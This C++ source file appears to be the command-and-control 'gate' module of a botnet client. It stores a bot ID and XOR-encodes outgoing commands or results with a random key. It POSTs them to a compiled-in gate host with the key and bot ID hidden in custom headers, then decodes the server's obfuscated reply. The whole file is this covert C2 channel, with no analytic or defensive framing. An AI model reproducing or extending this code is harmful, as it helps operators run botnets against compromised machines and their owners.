#include "Gate.h"
#include "HttpQuery.h"
#include "GateHelper.h"
#include "WebSafeEncryption.h"
#include <string>

char* botId = "-1";

void SetBotId(char* newId) {
	botId = (char*)malloc(strlen(newId) + 1);
	botId[strlen(newId)] = 0;
	memcpy_s(botId, strlen(newId), newId, strlen(newId));
}

char* GetBotId() {
	return botId;
}

char* SendCommandWithDecodedResponse(char* command) {
	char* key = GenerateKey(32);
	char* encodedKey;

	char* encodedResult = GetEncodedXorResult(command, key, strlen(command), 32, &encodedKey);
	FreeKey(key);
	
	
	NameValuePair* headers[] = {
		new NameValuePair("X-Token", encodedKey),
		new NameValuePair("X-Id", botId),
		0
	};

	NameValuePair* postData[] = {
		new NameValuePair("x", encodedResult),
		0
	};

	NameValuePair** returnedHeaders;
	char* returnedData;
	int dataLength;

	int result = HTTPQuery((char*)GATE_HOST, (char*)GATE_PATH, headers, &returnedHeaders, &returnedData, &dataLength, true, "POST", postData);
	FreeEncodedXorResult(encodedResult, encodedKey);

	char* newKey = 0;

	NameValuePair** headerPointer = returnedHeaders;

	while (headerPointer != 0 && *headerPointer != 0)
	{
		if (strcmp((*headerPointer)->Name, "X-Token") == 0)
		{
			newKey = (char*)(*headerPointer)->Value;
			break;
		}

		headerPointer++;
	}


	int outputLength;
	char* output = GetDecodedXorResult(returnedData, newKey, &outputLength);
	
	char* returnBuffer = (char*)malloc(outputLength + 1);
	returnBuffer[outputLength] = 0;
	memcpy_s(returnBuffer, outputLength, output, outputLength);

	FreeDecodedXorResult(output);


	int i = 0;
	while (headers[i] != 0)
	{
		delete (headers[i]);
		i++;
	}

	i = 0;
	while (postData[i] != 0)
	{
		delete (postData[i]);
		i++;
	}

	FreeHTTPResponse(returnedHeaders, returnedData);

	return returnBuffer;
}

void FreeDecodedResponse(char* response) {
	free(response);
}